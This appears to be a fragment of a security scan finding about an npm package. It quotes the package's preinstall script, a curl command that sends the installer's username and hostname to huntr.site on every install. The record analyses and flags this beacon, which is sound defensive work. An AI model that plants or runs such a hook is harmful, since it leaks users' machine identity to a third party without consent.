  "summary": "preinstall script exfiltrates username and hostname to remote endpoint",
  "details": "package.json declares a preinstall lifecycle script `curl https://huntr.site/$(whoami)@$(hostname)` which fires automatically on `npm install`. The script executes `whoami` and `hostname` and transmits the installer's OS username and machine hostname to huntr.site as part of the URL path. The package has no other functionality — its sole on-install effect is to beacon installer identity to a third-party domain. No build, native-addon, or vendor-SDK purpose justifies this network call.",
